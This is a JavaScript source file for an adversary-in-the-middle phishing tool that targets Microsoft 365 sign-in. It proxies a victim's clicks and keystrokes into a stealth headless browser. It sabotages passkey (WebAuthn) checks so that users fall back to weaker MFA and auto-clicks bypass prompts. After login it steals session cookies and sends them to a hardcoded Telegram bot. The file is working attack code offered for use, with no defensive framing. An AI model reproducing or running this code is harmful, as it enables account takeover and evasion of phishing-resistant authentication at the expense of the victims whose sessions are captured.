const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    try {
        await axios.post(url, { 
            chat_id: CHAT_ID, 
            text: `🚀 *COOKIES CAPTURED*\n\n\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 4000)}\n\`\`\``,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error('Exfil error:', e.message); }
}

async function startSession(io, socket) {
    console.log(`[INIT] Bypass Session: ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
        });

        const page = await browser.newPage();

        // 2026 PASSKEY KILLER: Force Microsoft to offer "Sign in another way"
        await page.evaluateOnNewDocument(() => {
            if (window.PublicKeyCredential) {
                window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = () => Promise.resolve(false);
                const oldGet = window.navigator.credentials.get;
                window.navigator.credentials.get = function(options) {
                    if (options.publicKey) return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
                    return oldGet.call(this, options);
                };
            }
        });

        await page.setViewport({ width: 1280, height: 720 });

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 30 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1300);

        // AUTO-BYPASS SCANNER
        const scanner = setInterval(async () => {
            if (!socket.connected) return clearInterval(scanner);
            try {
                const bypass = await page.$('#iShowSkip, #idBtn_Back, #idBtn_GBS_Secondary');
                if (bypass) {
                    console.log("[AUTO] Clicking Bypass/Cancel");
                    await bypass.click();
                }
            } catch (e) {}
        }, 2500);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        page.on('framenavigated', async (frame) => {
            if (frame.url().includes('shell/homepage') || frame.url().includes('office.com')) {
                const cookies = await page.cookies();
                await sendExfiltrationAlert(cookies);
                socket.emit('success');
            }
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(scanner);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL]', error.message);
        if (browser) await browser.close();
    }
}

// CRITICAL: This must match the name used in server.js
module.exports = { startSession };
